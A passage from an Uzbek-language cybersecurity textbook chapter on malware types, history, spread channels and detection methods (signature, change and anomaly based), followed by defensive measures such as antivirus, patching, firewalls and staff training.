	•	Ma’lumotlar sizib chiqishi raqamli iz uchun qanday xavf tug‘diradi va uni qanday aniqlash mumkin?
	•	Onlayn shaxsiylik (online identity) qanday shakllanadi va unda eski profil yoki kontentlarning roli nimada?
	•	Raqamli izni kamaytirish uchun foydalanuvchi bajarishi kerak bo‘lgan asosiy choralar nimalardan iborat?
	•	VPN, kuchli parollar va ijtimoiy tarmoqlardagi maxfiylik sozlamalari raqamli izni himoyalashda qanday ahamiyatga ega?
Nazorat savollari

VIII BOB. ZARARLI DASTURLAR TAHLILI VA UNDAN HIMOYALANISH

VIII BOB. ZARARLI DASTURLAR TAHLILI VA UNDAN HIMOYALANISH




Ta’lim maqsadlari:
–	zararli dasturlar turlarini ta’riflaydi va farqlaydi;
–	xavfsiz sandbox muhitida zararli dastur namunalarining xatti-harakatlarini kuzatadi va asosiy belgilarini aniqlaydi;
–	antivirus va anti-malware vositalarining aniqlash usullarini (signatura, xulq-atvor, evristika) tahlil qiladi va ularning cheklovlarini izohlaydi;
–	Windows Defender (yoki shunga o‘xshash vositalar) yordamida tizimni skanerlashni amalga oshiradi va topilgan tahdidlarni baholaydi;
–	sandboxing va izolyatsiya tushunchalarini tushuntiradi hamda virtual mashinalarning xavfsizlikdagi rolini asoslaydi;
–	VirtualBox yordamida izolyatsiyalangan test muhitini yaratadi va xavfsiz foydalanish qoidalariga amal qiladi;
–	Ransomware hujumlariga qarshi himoya strategiyalarini (zaxira nusxa, tiklash) tahlil qiladi;
–	ma’lumotlarni zaxiralash va tiklash jarayonini amaliyotda bajaradi hamda tizimni zararlanishdan so‘ng qayta tiklaydi;
–	shubhali jarayonlarni aniqlaydi, Task Manager yoki Process Explorer orqali ularni kriminalistik nuqtai nazardan tahlil qiladi va himoya choralarini taklif etadi.
Bobni o‘zlashtirish uchun tavsiya etiladigan qo‘shimcha kurslar:
1. Zararli dastur tahlili va Assembler tiliga kirish (Malware Analysis and Introduction to Assembly Language) - https://www.coursera.org/learn/malware-analysis-and-assembly 
2. Ilg‘or zararli dasturlar va tarmoq anomaliyalarini aniqlash (Advanced Malware and Network Anomaly Detection) - https://www.coursera.org/learn/advanced-malware-and-network-anomaly-detection 
8-bob haqida umumiy ma’lumot
Mazkur bobda zararli dasturlar, ularni yaratishdan asosiy maqsad, uning yaratilish tarixi, zararli dasturlarning turlari, zararli dasturlarni aniqlash usullari va ularning kamchiliklari, zararli dasturlarni aniqlashning zamonaviy vositalari, virtual mashina texnologiyasi, sandboxing vositalari, ransomware dasturi, uning maqsadi, turlari, tarqalish usullari, ransomware zararli dasturidan himoyalanish usullari, ma’lumotlarni zaxira nusxalash, qayta tiklash usullari haqida ma’lumotlar berilgan.

8.1. Zararli dastur turlari  (Ma’ruza mashg‘uloti)
1. Zararli dasturlar. 
2. Zararli dasturlarning turlari: viruslar, troyanlar, ransomware, spyware, adware, botnet, rootkit.
3. Zararli dasturlarni yaratishdan asosiy maqsad. 
4. Zararli dasturlarning yaratilish tarixi. 
Reja:
1. Zararli dasturlar. 
2. Zararli dasturlarning turlari: viruslar, troyanlar, ransomware, spyware, adware, botnet, rootkit.
3. Zararli dasturlarni yaratishdan asosiy maqsad. 
4. Zararli dasturlarning yaratilish tarixi. 
Reja:

Zararli dasturlar, malware, viruslar, troyanlar, ransomware, spyware, adware, botnet, rootkit, moddiy manfaat.
Kalit so‘zlar:
Zararli dasturlar, malware, viruslar, troyanlar, ransomware, spyware, adware, botnet, rootkit, moddiy manfaat.
Kalit so‘zlar:
Zararli dasturlar
Zararli dastur (malware) - bu yovuz niyatlarda ishlatilishi uchun yaratilgan har qanday kompyuter dasturi yoki dasturiy ta’minotdir. Malware yordamida ma’lumotlar o‘g‘irlanadi yoki kompyuter va dasturiy tizimlarga zarar yetkaziladi. Malware turli xil kiber tahdidlarni o‘z ichiga oladi, masalan: viruslar, adware, spyware va ransomware. Ko‘pincha kiberhujumlarning asosiy maqsadi - moliyaviy manfaat uchun malwaredan foydalanishdir.
Firibgarlikka asoslangan sotsial injiniring usullari, masalan, fishing orqali kiberjinoyatchilar korporativ tarmoqqa noqonuniy foydalanish huquqini qo‘lga kiritishi mumkin. Tarmoqqa kirgach, ular erkin harakatlanib, ma’lumotlar va intellektual mulkni o‘g‘irlashi, maxfiy ma’lumotlarga kirishishi, kuzatuv olib borishi va tizimlarga zarar yetkazishi mumkin.
Eng mashhur va qo‘rqinchli hodisalardan biri - ransomware xabari bo‘lib, unda IT bo‘limiga muhim biznes ma’lumotlari to‘lov amalga oshirilmaguncha shifrlab qo‘yilgani haqida xabar beriladi. Davlatlararo hujumlarda esa boshqa maqsadlar bo‘lishi mumkin: mamlakat hududining katta qismida internetni ishdan chiqarish, elektr infratuzilmasini to‘xtatish yoki ma’lumot o‘g‘irligi (savdo sirlari yoki intellektual mulk) shaklida sanoat josusligini amalga oshirish.
Iste’molchilar yoki istalgan joydan ishlovchi foydalanuvchilar malware hujumining qurboniga aylanganda, qurilmalarda quyidagi holatlarga duch kelishlari mumkin:
	•	kompyuterning sekin ishlashi, bu internet tezligi va dastur ilovalarining pasayishiga olib keladi;
	•	qurilma yoki kompyuterning tez-tez ishdan chiqishi yoki qotib qolishi;
	•	juda ko‘p pop-up reklamalarning paydo bo‘lishi - bu adware belgisidir. Ularni bosish yanada ko‘proq zararli kod ishga tushishiga sabab bo‘ladi;
	•	disk xotirasining kamayib ketishi mavjud bo‘sh joyning keskin yo‘qolishi kompyuterda malware borligini anglatishi mumkin;
	•	foydalanuvchi faoliyatiga mos kelmaydigan internet trafiki malware avtomatik ravishda internetga ulanayotgani belgisi bo‘lishi mumkin;
	•	tizimning haddan tashqari yuklanishi zararli dastur resurslarni egallab olgani sabab;
	•	brauzerda yangi asboblar (toolbars), kengaytmalar, bosh sahifaning o‘zgarishi yoki firibgarlik saytlariga yo‘naltirilishi.
Zararli dasturlarning turlari: viruslar, troyanlar, ransomware, spyware, adware, botnet, rootkit
Zararli dasturlarning hozirda quyidagi kо‘rinishlari keng tarqalgan:
	•	Viruslar: о‘zini о‘zi kо‘paytiradigan dastur bо‘lib, о‘zini boshqa dastur ichiga, kompyuterning yuklanuvchi sektoriga yoki hujjat ichiga biriktiradi;
	•	Troyan otlari: bir qarashda yaxshi va foydali kabi kо‘rinuvchi dasturiy vosita sifatida о‘zini kо‘rsatsada, yashiringan zararli koddan iborat. Troyan dasturlar о‘zlari kо‘paymaydi va tarqatilmaydi. Tashqaridan troyan dasturlar mutlaqo beozor kо‘rinadi, hatto foydali funksiyalarni tavsiya etadi. Ammo, foydalanuvchi bunday dasturni kompyuteriga yuklab, ishga tushirsa, dastur bildirmay zarar keltiruvchi funksiyalarni bajarishi mumkin. Kо‘pincha troyan dasturlar viruslarni dastlabki tarqatishda, Internet orqali masofadagi kompyuterdan foydalanishda, ma’lumotlarni о‘g‘rilashda yoki ularni yо‘q qilishda ishlatiladi.
	•	Adware: marketing maqsadida yoki reklamani namoyish qilish uchun foydalanuvchi faoliyatini kuzatib boruvchi dasturiy ta’minot;
	•	Spyware: foydalanuvchi ma’lumotlarini qо‘lga kirituvchi va uni hujumchiga yuboruvchi dasturiy kod;
	•	Rootkits: ushbu zararli dasturiy vosita operatsion tizim tomonidan aniqlanmasligi uchun о‘z harakatlarini yashiradi;
	•	Backdoors: zararli dasturiy kodlar bо‘lib, hujumchiga autentifikatsiyani amalga oshirmasdan, aylanib о‘tib tizimga kirish imkonini beradi, masalan, ma’mur parolisiz imtiyozga ega bо‘lish;
	•	Mantiqiy bomba – ma’lum sharoitlarda zarar keltiruvchi harakatlarni bajaruvchi dastur yoki uning alohida modullari. Mantiqiy bomba, masalan, ma’lum sana kelganda yoki ma’lumotlar bazasida yozuv paydo bо‘lganida yoki yо‘q bо‘lganida va hk. ishga tushishi mumkin. Bunday bomba viruslarga, troyan dasturlarga va oddiy dasturlarga joylashtirilishi mumkin;
	•	Botnet: Internet tarmog‘idagi obrо‘sizlantirilgan kompyuterlar bо‘lib, taqsimlangan hujumlarni amalga oshirish uchun hujumchi tomonidan foydalaniladi;
	•	Ransomware: mazkur zararli dasturiy ta’minot qurbon kompyuterida mavjud qimmatli fayllarni shifrlaydi yoki qulflab qо‘yib, tо‘lov amalga oshirilishini talab qiladi.
Ularni yaratishdan asosiy maqsad
Malwarening asosiy maqsadi - tizimda tartibsizlik keltirib chiqarish, ma’lumot yoki resurslarni o‘g‘irlash va ko‘pincha moliyaviy foyda yoki sabotajga erishishdir. Ular haqida quyida batafsil ma’lumot berilgan:
Intellekt yig‘ish va yashirin kirish (Intelligence and intrusion)
Malware tizimga yashirincha kirib, email yozishmalari, strategik reja va loyihalar, shuningdek, eng muhim xavfsizlik ma’lumotlari - parollar, loginlar, autentifikatsiya ma’lumotlarini o‘g‘irlaydi.
Bunday hujumlar ko‘pincha keylogging, spyware, yoki remote access trojan (RAT) kabi vositalar orqali amalga oshiriladi. Natijada, hujumchi tizimni masofadan boshqarishi yoki maxfiy ma’lumotlarni uzluksiz yig‘ib borishi mumkin.
Tizimni izdan chiqarish va tovlamachilik (Disruption and extortion)
Malware butun tarmoqni yoki kompyuterlarni bloklab qo‘yib, ularni ishlatib bo‘lmaydigan holga keltirishi mumkin. Agar zararli dastur qurilmani bloklash orqali pul talab qilsa, bu ransomware deb ataladi.
Masalan: Fayllarni shifrlab, ularni ochish uchun to‘lov talab qiladi. Muhim biznes jarayonlarini to‘xtatib, tashkilot faoliyatiga katta zarar yetkazadi. Ayrim ransomware turlari nafaqat fayllarni shifrlaydi, balki ularni internetga chiqarish bilan qo‘rqitib, qo‘shimcha bosim o‘tkazadi.
Tizimlarni yo‘q qilish yoki vandalizm (Destruction or vandalism)
Ba’zi malware turlari tarmoq infratuzilmasiga jiddiy zarar yetkazish maqsadida yaratiladi. Ular fayllarni butkul o‘chirib yuborishi, operatsion tizimni ishlamay qoladigan darajaga keltirishi, muhim xizmatlarni to‘xtatishi mumkin.
Bunday hujumlar ko‘pincha siyosiy, harbiy yoki sabotaj maqsadida amalga oshiriladi va ular wiper turidagi malwarelar orqali bajariladi.
Kompyuter resurslarini o‘g‘irlash (Steal computer resources)
Hujumchi tizimning hisoblash quvvatidan o‘z manfaatiga ishlatadi. Bunday holatlarga quyidagilar kiradi:
	•	botnetlar uchun qurilmalarni boshqariladigan “zombi”ga aylantirish;
	•	kriptovalyuta qazib olish (cryptojacking) uchun protsessor va grafik kartani yashirincha ishlatish;
	•	qurilmadan spam email jo‘natish yoki DDoS hujumlarida foydalanish.
Bu jarayon foydalanuvchiga sezilmasligi mumkin, ammo kompyuter sekinlashadi, elektr sarfi oshadi va qurilma ertasiga ishdan chiqishi mumkin.
Moliyaviy manfaat (Monetary gain)
Kiberjinoyatchilar ko‘pincha o‘g‘irlangan ma’lumotlar yoki intellektual mulkni dark webda sotadi. Masalan, mijozlar bazalari, bank ma’lumotlari, shaxsiy identifikatsiya ma’lumotlari, kompaniya ichki hujjatlari, tadqiqotlar, loyihalar yoki patentga oid materiallar. Bu ma’lumotlar boshqa jinoyatchilar tomonidan firibgarlik, identifikatsiya o‘g‘irlash yoki sanoat josusligida qo‘llanadi.
Uning yaratilish tarixi
1982-yil
“Keraksiz dasturiy ta’minot (unwanted software)” - malware uchun eng keng tarqalgan ta’riflardan biridir. 1982-yilda paydo bo‘lgan Elk Cloner esa ushbu ta’rifga mos keladigan ilk misollardan biri bo‘lgan. U floppi disklari orqali Apple II kompyuterlariga tarqalgan. U kompyuterlarga bevosita zarar yetkazmagan bo‘lsada, tizimga ruxsatsiz kirish hodisasini namoyon qilgan va bu esa malware tushunchasining shakllanishiga asos bo‘lgan.
1990-yillar
1990-yillarga kelib, Microsoft Windows shaxsiy kompyuterlar uchun ommaviy operatsion tizimga aylangach, xakerlar Microsoft Word ilovasining makro tili orqali zararli kodlar yozishni boshladilar. Bu kodlar Windows ekotizimi bo‘ylab tez tarqalib, malware hukmron bo‘lgan zamonaviy kiber tahdidlar manzarasini shakllantira boshladi.
2002-yillar
2002–2007-yillar oralig‘ida, tezkor xabarlashuv xizmatlari ommalashgach, hujumchilar worm (o‘z-o‘zini ko‘paytiruvchi qurt) turlarini ishlab chiqishni boshladi. Ushbu qurtlar AOL, MSN Messenger, AIM va Yahoo Messenger orqali tarqaldi.
Xabarlar odatda qiziqish uyg‘otuvchi jumlalar bilan yuborilar edi, masalan: “Bu suratdagi odam kim o‘zi???”.  Foydalanuvchi xabardagi havolani bosishi bilan malware tizimga yuklanib olardi. So‘ng u qurbonning kontaktlar ro‘yxatidagi har bir odamga zararli havola yuborib, qurbonning kompyuterini tahdid tarqatish vositasiga aylantirardi.
2005-yillar
2005–2009-yillarda adware yana keng tarqala boshlandi. U dastlab mahsulotlarni reklama qilish uchun mo‘ljallangan qonuniy dastur sifatida paydo bo‘lgan. Ammo vaqt o‘tishi bilan reklamalar yolg‘on, chalg‘ituvchi tus ola boshladi. Shundan so‘ng ko‘plab dastur ishlab chiquvchilar adware ishlab chiqaruvchilarni sudga berdi va natijada ko‘pchiligi yopildi. Shunga qaramay, to‘liq ekranli, yopilmaydigan bezovta qiluvchi reklamalar bugungi kungacha adwarening merosi sifatida saqlanib qolgan.
2007-yillar
2007–2009-yillar orasida ijtimoiy tarmoqlar (Myspace, Twitter va Facebook) tez sur’atlarda ommalashdi. Malware ishlab chiquvchilar bu imkoniyatdan foydalanib, zararli havolalar, ilovalar va reklamalar orqali malware tarqatishni kuchaytirdilar.
2013-yillar
2013-yilda eng xavfli malware turlaridan biri, ransomware keng tarqala boshladi. U Trojans (ya’ni, foydali ko‘ringan, ammo ichida zararli kod yashiringan dasturlar), eksploitlar va zararli reklamalar orqali tarqalgan. Bugungi kunda ham ransomware malware hujumlarining eng asosiy vositalaridan biri bo‘lib qolmoqda.
2015-yillar
2017-yilda cryptojacking, ya’ni bunda xakerlar foydalanuvchilarning qurilmalaridan yashirincha kriptovalyuta qazish uchun foydalanadi, keng tarqaldi. Kriptovalyutalarning mashhurligi ortgani sari bu hujum turi ham ko‘paydi.
Bugungi kungacha ransomware, cryptojacking, adware kabi turlar malware dunyosida eng faol va keng tarqalgan tahdidlar bo‘lib qolmoqda. Yaqqol aytish mumkinki, yaqin orada ular sekinlashish belgisi ko‘rinmayapti.
Viruslar va zarar keltiruvchi dasturlarni tarqatish kanallari
Kompyuterlar va korporativ tarmoqlarni himoyalovchi samarador tizimni yaratish uchun qayerdan xavf tug‘ilishini aniq tasavvur etish lozim. Viruslar tarqalishning juda xilma-xil kanallarini topadi. Buning ustiga eski usullarga yangisi qо‘shiladi.
Tarqatishning klassik (mumtoz) usullari. Fayl viruslari dastur fayllari bilan birgalikda disketlar va dasturlar almashishda, tarmoq kataloglaridan, Web yoki FTP – serverlardan dasturlar yuklanishida tarqatiladi. Yuklama viruslar kompyuterga foydalanuvchi zaharlangan disketani diskovodda qoldirib, sо‘ngra operatsion tizimni qayta yuklashida tushib qoladi. Yuklama virus kompyuterga viruslarning boshqa xili orqali kiritilishi mumkin. Makrokomanda viruslari MicroSoftWord, Excel, Access fayllari kabi ofis hujjatlarining zaxarlangan fayllari almashinishida tarqaladi.
Agar zaharlangan kompyuter lokal tarmoqqa ulangan bо‘lsa virus osongina fayl-server disklariga tushib qolishi, u yerdan kataloglar orqali tarmoqning barcha kompyuterlariga о‘tishi mumkin. Shu tariqa virus epidemiyasi boshlanadi. Virus tarmoqda shu virus tushib qolgan kompyuter foydalanuvchisi huquqlari kabi huquqqa ega ekanligini tizim ma’muri unutmasligi lozim. Shuning uchun u foydalanuvchi foydalanadigan barcha kataloglarga tushib qolishi mumkin. Agar virus tarmoq ma’muri ishchi stansiyasiga tushib qolsa oqibati juda og‘ir bо‘lishi mumkin.
Elektron pochta. Hozirda Internet global tarmog‘i viruslarning asosiy manbai hisoblanadi. Viruslar bilan zaharlanishlarning aksariyati MicroSoftWord formatida xatlar almashishda sodir bо‘ladi. Elektron pochta axborot bilan bir qatorda kо‘pincha ofis hujjatlarini jо‘natgani bois, makroviruslarni tarqatish kanali vazifasini о‘taydi.
Viruslar bilan zaharlash bilmasdan va yomon niyatda amalga oshirilishi mumkin. Masalan, makrovirus bilan zaharlangan muharrirdan foydalanuvchi о‘zi shubha qilmagan holda, adresatlarga zaharlangan xatlarni jо‘natishi mumkin. Ikkinchi tarafdan niyati buzuq odam atayin elektron pochta orqali har qanday xavfli dasturiy kodni jо‘natishi mumkin.
Troyan Web-saytlar. Foydalanuvchilar virusni yoki troyan dasturni Internet saytlarining oddiy kuzatishda, troyan Web-saytni kо‘rganida olishi mumkin. Foydalanuvchi brauzerlaridagi xatoliklar kо‘pincha troyan Web-saytlari faol komponentlarining foydalanuvchi kompyuterlariga zarar keltiruvchi dasturlarni kiritishiga sabab bо‘ladi. Troyan saytni kо‘rishga taklifni foydalanuvchi oddiy elektron xat orqali olishi mumkin.
Lokal tarmoqlar. Lokal tarmoqlar ham tezlikda zaharlanish vositasi hisoblanadi. Agar himoyaning zaruriy choralari kо‘rilmasa, zaharlangan ishchi stansiya lokal tarmoqqa kirishda serverdagi bir yoki bir necha xizmatchi fayllarni zaharlaydi. Bunday fayllar sifatida Login.com xizmatchi faylni, firmada qо‘llaniluvchi Excel-jadvallar va standart hujjat-shablonlarni kо‘rsatish mumkin. Foydalanuvchilar bu tarmoqqa kirishida serverdan zaharlangan fayllarni ishga tushiradi, natijada virus foydalanuvchi kompyuteridan foydalana oladi.
Zarar keltiruvchi dasturlarni tarqatishning boshqa kanallari. Viruslarni tarqatish kanallaridan biri dasturiy ta’minotning qaroqchi nusxalari hisoblanadi. Disketlar va CD-disklardagi noqununiy nusxalarda kо‘pincha turli-tuman viruslar bilan zaharlangan fayllar bо‘ladi. Viruslarni tarqatish manbalariga elektron konferensiyalar va FTP va BBS fayl-serverlar ham taalluqli.
О‘quv yurtlarida va Internet-markazlarida о‘rnatilgan va umumfoydalanish rejimida ishlovchi kompyuterlar ham osongina viruslarni tarqatish manbaiga aylanishi mumkin. Agar bunday kompyuterlardan biri navbatdagi foydalanuvchi disketidan zaharlangan bо‘lsa, shu kompyuterda ishlovchi boshqa foydalanuvchilar disketlari ham zaharlanadi.
Kompyuter texnologiyasining rivojlanishi bilan kompyuter viruslari ham, о‘zining yangi yashash makoniga moslashgan holda takomillashadi. Har qanday onda yangi, oldin ma’lum bо‘lmagan yoki ma’lum bо‘lgan, ammo yangi kompyuter asbob-uskunasiga mо‘ljallangan kompyuter viruslari, troyan dasturlari va qurtlar paydo bо‘lishi mumkin. Yangi viruslar ma’lum bо‘lmagan yoki oldin mavjud bо‘lmagan tarqatish kanallaridan hamda kompyuter tizimlarga tatbiq etishning yangi texnologiyalaridan foydalanishi mumkin. Virusdan zaharlanish xavfini yо‘qotish uchun korporativ tarmoqning tizim ma’muri, nafaqat virusga qarshi usullardan foydalanishi, balki kompyuter viruslari dunyosini doimo kuzatib borishi shart.
Zararli dasturlar va ularning turlarini ayting?
	•	Malware tizimga kirgandan so‘ng qanday yo‘llar bilan ma’lumot o‘g‘irlashi yoki maxfiylikni buzishi mumkin?
	•	Ransomware va oddiy virus o‘rtasidagi asosiy farq nimada?
	•	Malware foydalanuvchi kompyuterining hisoblash resurslaridan qanday maqsadlarda foydalanishi mumkin? (masalan, botnet, cryptojacking)
	•	Spyware, adware va trojan dasturlarining vazifalari nimadan iborat va ular foydalanuvchi qurilmasiga qanday xavf tug‘diradi?
	•	Malware odatda qanday usullar orqali tarqaladi? (email, phishing, flash-disklar, zararli havolalar va boshqalar)
	•	Malware qurbonning kompyuterida qanday alomatlar orqali sezilishi mumkin? (sekinlashuv, pop-up reklamalar, disk xotirasining kamayishi va hokazo)
	•	Kiberjinoyatchilar malware orqali qanday moliyaviy foyda ko‘rishi mumkin?
Nazorat savollari
	•	Zararli dasturlar va ularning turlarini ayting?
	•	Malware tizimga kirgandan so‘ng qanday yo‘llar bilan ma’lumot o‘g‘irlashi yoki maxfiylikni buzishi mumkin?
	•	Ransomware va oddiy virus o‘rtasidagi asosiy farq nimada?
	•	Malware foydalanuvchi kompyuterining hisoblash resurslaridan qanday maqsadlarda foydalanishi mumkin? (masalan, botnet, cryptojacking)
	•	Spyware, adware va trojan dasturlarining vazifalari nimadan iborat va ular foydalanuvchi qurilmasiga qanday xavf tug‘diradi?
	•	Malware odatda qanday usullar orqali tarqaladi? (email, phishing, flash-disklar, zararli havolalar va boshqalar)
	•	Malware qurbonning kompyuterida qanday alomatlar orqali sezilishi mumkin? (sekinlashuv, pop-up reklamalar, disk xotirasining kamayishi va hokazo)
	•	Kiberjinoyatchilar malware orqali qanday moliyaviy foyda ko‘rishi mumkin?
Nazorat savollari
8.2. Antivirus va anti-malware vositalari  (Ma’ruza mashg‘uloti)
1. Zararli dasturlarni aniqlash usullari va ularning kamchiliklari. 2. Zararli dasturlarni aniqlashning zamonaviy vositalari.
Reja:
1. Zararli dasturlarni aniqlash usullari va ularning kamchiliklari. 2. Zararli dasturlarni aniqlashning zamonaviy vositalari.
Reja:

Signaturaga asoslangan, о‘zgarishlarni aniqlashga asoslangan, anomaliyaga asoslangan, Antivirus, Anti-Malware, yangilanishlarni boshqarish, zaxira nusxalash.
Kalit so‘zlar:
Signaturaga asoslangan, о‘zgarishlarni aniqlashga asoslangan, anomaliyaga asoslangan, Antivirus, Anti-Malware, yangilanishlarni boshqarish, zaxira nusxalash.
Kalit so‘zlar:
Zararli dasturlarni aniqlash usullari va ularning kamchiliklari 
Zararli dasturiy vositalarni aniqlashda asosan uchta yondashuvdan foydalaniladi. Birinchisi va eng keng tarqalgani signaturaga asoslangan aniqlash bо‘lib, zararli dasturdagi shablon yoki signaturani topishga asoslanadi. Ikkinchi yondashuv о‘zgarishlarni aniqlashga asoslangan bо‘lib, о‘zgarishga uchragan fayllarni aniqlaydi. О‘zgarishi kutilmagan fayl о‘zgarganida zararlangan deb topiladi. Uchinchi yondashuv anomaliyaga asoslangan, noodatiy yoki virusga о‘xshash fayllarni va holatlarni aniqlashga asoslanadi. 
Signaturaga asoslangan aniqlash. Signatura bu – faylda topilgan bitlar qatori bо‘lib, maxsus belgilarni о‘z ichiga oladi. Bu о‘rinda ularning xesh qiymatlari ham signatura sifatida xizmat qilishi mumkin. Biroq, bu usul kam moslashuvchanlik darajasiga ega bо‘lib, virus yozuvchilari tomonidan osongina chetlanib о‘tilishi mumkin.
Masalan, W32/Beast virusi (1999-yilda aniqlangan Microsoft Word hujjatini zararlashga qaratilgan virus) uchun 83EB  0274  EBOE 740A  81EB  0301  0000 signaturasi foydalanilgan. Bu holda tizimdagi barcha fayllar ichida ushbu signatura qidiriladi. Biroq, biror fayl ichida ushbu signatura aniqlangan vaqtda ham tо‘liq virusni topdik deb aytish mumkin emas. Sababi, biror virus bо‘lmagan fayl tarkibida ham ushbu signatura bо‘lishi mumkin. Agar qidiriladigan fayllarda bitlar tasodifiy bо‘lsa, ushbu holatning bо‘lishi ehtimoli 1/2112 ga teng bо‘ladi. Biroq, kompyuter dasturlari va ma’lumotlar ichidagi bitlar tasodifiylikdan yiroq va bu ehtimolni yanada ortishini anglatadi. Boshqacha aytganda, biror fayldan signatura aniqlangan taqdirda ham, uni qо‘shimcha tekshirish amalga oshirilishi zarur.
Signaturaga asoslangan aniqlash usuli virus aniq bо‘lganida va umumiy bо‘lgan signaturalar ajratilgan holatda juda yuqori samaradorlikka ega. Bundan tashqari, ushbu usulga binoan foydalanuvchi va ma’murga minimal yuklama yuklanadi va ularga faqat signaturalarni saqlash va uzluksiz yangilash vazifasini qо‘yadi.
Biroq, signaturalar saqlangan faylning hajmi katta bо‘lib, 10 yoki 100 minglab signaturaga ega fayl yordamida skanerlash juda kо‘p vaqt oladi. Bundan tashqari, biror aniqlangan virusni kichik о‘zgartirish orqali ushbu usulni osonlik bilan aldab о‘tish mumkin.
Hozirgi kunda signaturaga asoslangan tanib olish usuli zamonaviy antivirus yoki zararli dasturlarga qarshi himoya vositalarida keng qо‘llaniladi. 
О‘zgarishlarni aniqlovchi usul. Zararli dasturlar ma’lum manzilda joylashganligi sababli, tizimdagi biror joyda о‘zgarish aniqlansa, zararlanishni kо‘rsatish mumkin. Ya’ni, agar о‘zgarishga uchragan fayl aniqlansa, u virus orqali zararlangan bо‘lishi mumkin. 
О‘zgarishlarni qanday aniqlash mumkin? Ushbu muammoni yechishda xesh-funksiyalar mos keladi. Faraz qilaylik, tizimdagi barcha fayllar xeshlanib, xesh qiymatlari xavfsiz manzilda saqlangan bо‘lsin. U holda vaqti-vaqti bilan ushbu faylning xesh qiymatlari qaytadan xeshlanadi va dastlabki holatdagilari bilan taqqoslanadi. Agar faylning bir yoki bir nechta bitlari о‘zgarishga uchragan bо‘lsa, xesh qiymatlar bir biriga mos kelmaydi va fayl virus tomonidan zararlangan hisoblanadi. 
Ushbu usulning afzalliklaridan biri shuki, agar fayl zararlangan bо‘lsa, uni tо‘liq aniqlash mumkin. Bundan tashqari, oldin noma’lum bо‘lgan zararli dasturni ham aniqlash mumkin.
Biroq, ushbu usul kamchiliklarga ega. Tizimdagi fayllar odatda tez-tez о‘zgarib turadi va natijada yolg‘ondan zararlangan deb topilgan holatlar soni ortadi. Agar virus tizimdagi tez-tez о‘zgaruvchi fayl ichiga joylashtirilgan bо‘lsa, ushbu usulni osonlik bilan aylanib о‘tish mumkin. Bu holda ushbu fayldagi о‘zgarishni log fayl orqali aniqlash kо‘p vaqt talab qiladi va bu signaturaga asoslangan usuldagi kabi muammolarga olib keladi.
Anomaliyaga asoslangan aniqlash. Anomaliyaga asoslangan usul noodatiy yoki virusga о‘xshash yoki bо‘lishi mumkin bо‘lgan zararli harakatlarni yoki xususiyatlarni topishni maqsad qiladi. Ushbu g‘oya IDS tizimlarida ham foydalaniladi.
Ushbu usulning fundamental muammosi - qaysi holatni normal va qaysi holatni normal bо‘lmagan deb topish hamda ushbu ikki holat orasidagi farqni aniqlash hisoblanadi. Bundan tashqari, normal holatning о‘zgarishi va tizimning bu holatga moslashish muammosi ham mavjud. Bu esa kо‘plab notо‘g‘ri signallarni paydo bо‘lishiga sabab bо‘ladi. Ushbu usulning afzalligi sifatida oldin noma’lum bо‘lgan zararli dasturlarni aniqlash imkonini kо‘rsatish mumkin.
AI va Mashinali o‘rganish (Machine Learning). AI asosidagi xavfsizlik yechimlari mashina o‘rganish algoritmlaridan foydalanib ulkan miqdordagi tahdidlar haqidagi ma’lumotlarni tahlil qiladi. Bunday tizimlar murakkab shablonlarni aniqlay oladi, potentsial tahdidlarni oldindan bashorat qiladi va yangi hamda murakkab malware turlaridan, jumladan zero-day eksploitlardan real vaqt rejimida himoya qiladi. Ma’lumotlarga ko‘ra, simulyatsiya qilingan hujum davomida generativ AIdan foydalanish ma’lumotlarni yashirin aniqlash (exfiltration) vaqtini o‘rtacha ikki kundan atigi 25 daqiqaga qisqartirgan.
Sandboxing (Qumli quti). Sandboxing - bu shubhali fayl yoki kodni maxsus ajratilgan, xavfsiz va virtual muhitda ishga tushirish jarayoni. Bu usul orqali axborot xavfsizligi mutaxassislari malware qanday ishlashini real operatsion tizim yoki tarmoqqa zarar yetkazmasdan o‘rganishlari mumkin.
Eng chetki qurilma uchun aniqlash va javob berish tizimi (Endpoint Detection and Response, EDR): EDR yechimlari kompyuterlar, serverlar va boshqa endpoint qurilmalaridagi faoliyatni doimiy kuzatadi, ma’lumotlarni to‘plab tahlil qiladi va shubhali hodisalarni aniqlaydi. EDR vositalar tahdidlarni faol ravishda izlashga (threat hunting), hodisalarga tezkor javob berishga, malware tarqalishini samarali tarzda cheklashga imkon beradi. Bu yondashuv korxonalarga hujumlarni erta aniqlash va ularning oqibatlarini minimallashtirishda yordam beradi.
Zararli dasturlarni aniqlashning zamonaviy vositalari
Quyidagi strategiyalar tizimning hujum yuzasini qisqartiradi va zararli dasturiy ta’minotning (malware) tizimlarga kirib borish imkoniyatlarini kamaytiradi.
Antivirus va Anti-Malware dasturlari
Ishonchli antivirus va anti-malware yechimlarini joriy etish asosiy himoya choralaridan biridir. Bu vositalar real vaqt rejimida himoya qiladi, muntazam ravishda tahdidlarni skanerlaydi, aniqlangan zararli dasturlarni karantinga oladi yoki o‘chiradi. Ularni muntazam yangilab borish yangi malware turlarini aniqlash imkonini beradi.
Yangilanishlarni boshqarish (Patch Management)
Operatsion tizimlar, dasturlar va qurilma operatsion tizimini doimiy ravishda yangilab borish juda muhim. Tahdidchilar ko‘pincha eskirgan dasturiy ta’minotdagi ma’lum zaifliklardan foydalanadi. Keng qamrovli yangilanishlarni boshqarish dasturi ushbu xavfsizlik bo‘shliqlarini kamaytiradi.
Tarmoqlararo ekran, firewallar
Tarmoq va host darajasidagi firewallar kiruvchi va chiquvchi tarmoq trafigini boshqaradi, ruxsatsiz ulanishlarni bloklaydi va zararli trafikni to‘sadi. Ular xavfsizlik qoidalariga asoslangan holda ma’lumot paketlarini filtrlovchi to‘siq sifatida ishlaydi.
Elektron pochta xavfsizligi
Kengaytirilgan email xavfsizlik tizimlari zararli xatlarni filtrlab chiqaradi, fishing urinishlarini aniqlaydi va yuqtirilgan ilovalarni foydalanuvchiga yetib borishidan oldin bloklaydi. Elektron pochta malware tarqalishining eng asosiy kanallaridan biri bo‘lgani bois bu juda muhim hisoblanadi.
Web filtrlash
Web filtrlash yechimlari foydalanuvchilarning zararli yoki yuqori xavfli deb tasniflangan saytlarga kirishini oldini oladi. Bu ko‘chirib olishga asoslangan hujumlaridan, brauzer darajasidagi eksploitlardan himoya qiladi.
Xodimlarni o‘qitish
Doimiy kiberxavfsizlik bo‘yicha o‘quv mashg‘ulotlari xodimlarga fishingni aniqlash, kuchli parollardan foydalanish, shubhali havola yoki yuklamalarning xavfini tushunish imkonini beradi.
